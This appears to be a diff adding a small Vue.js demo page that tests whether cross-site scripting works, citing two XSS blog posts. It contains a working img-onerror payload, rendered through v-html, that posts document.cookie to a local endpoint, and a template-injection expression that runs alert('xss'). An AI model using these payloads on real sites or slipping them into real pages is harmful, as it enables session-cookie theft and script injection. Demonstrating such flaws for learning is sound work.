@@ -1,0 +1,29 @@
+<html>
+    <head>
+        <title>Vue introduction</title>
+        <meta charset="utf-8">
+        <!-- development version, includes helpful console warnings -->
+        <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
+        <script type="module">
+
+        document.cookie = "username=John Doe";
+
+        new Vue({
+            el: '#app',
+            data: {
+                today: 'Today it is ' + new Date().toLocaleString(),
+                attack: '<img src="foo.png" onerror=fetch("/attack.json",{method:"POST",body:JSON.stringify(document.cookie)}) />', // https://blog.sqreen.com/xss-in-vue-js/
+            }
+        })
+        </script>
+    </head>
+    <body>
+        <h1>Can we do XSS?</h1>
+        <div id="app">
+            <p>{{ today }}</p>
+            <div v-html="attack"></div>
+            <!-- https://dev.to/nandod1707/should-you-care-about-xss-in-vuejs-1ea6 -->
+            <div>{{ constructor.constructor("alert('xss')")() }}</div>
+        </div>
+    </body>
+</html>
